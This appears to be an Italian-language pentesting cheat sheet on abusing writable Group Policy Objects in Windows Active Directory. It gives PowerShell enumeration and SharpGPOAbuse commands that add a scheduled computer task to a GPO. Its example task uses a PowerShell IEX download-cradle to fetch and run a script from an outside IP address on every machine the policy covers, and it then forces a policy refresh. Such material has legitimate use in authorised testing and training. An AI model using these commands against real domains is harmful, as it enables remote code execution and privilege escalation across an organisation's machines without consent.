# Group Policy Objects (GPO) Abuse (Windows)

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `SharpGPOAbuse.exe`, `PowerShell` |
| **SO Target** | Windows (Active Directory) |
| **Quando effettuare** | Se si ha il controllo di un utente con privilegi di modifica su una GPO |
| **Info Utili** | Esecuzione di comandi o creazione di task malevoli tramite policy di gruppo |

### Funzionamento
Se un utente ha permessi di scrittura su una GPO, può aggiungere task pianificati, script di avvio o modificare permessi per ottenere privilegi di amministratore su tutte le macchine a cui la GPO è applicata.

### Enumerazione GPO (PowerShell)
**Visualizzare tutte le GPO:**
```powershell
Get-GPO -All
```

### SharpGPOAbuse
Tool per automatizzare l'aggiunta di task malevoli.

**Aggiunta di un Computer Task (RCE):**
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "<TASK_NAME>" --Author <DOMAIN>\<USER> --Command "cmd.exe" --Arguments "/c <COMMAND>" --GPOName "<GPO_NAME>" --force
```
*Esempio:*
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author eh.local\Administrator --Command "cmd.exe" --Arguments "/c powershell.exe IEX (new-object net.webclient).downloadstring('http://10.10.169.2:8000/a.ps1')" --GPOName "owned" --force
```

### Forzare Aggiornamento Policy
Solitamente le policy si aggiornano ogni 90 minuti, ma è possibile forzare l'aggiornamento.
```powershell
gpupdate /force
```

### URL Fondamentali
- [SharpGPOAbuse GitHub](https://github.com/FSecureLABS/SharpGPOAbuse)
- [SharpCollection (Pre-compiled Binaries)](https://github.com/Flangvik/SharpCollection)
- [The Hacker Recipes - GPO Abuse](https://www.thehacker.recipes/ad/movement/group-policies)
- [SwisskyRepo - GPO Abuse](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-group-policy-objects/)
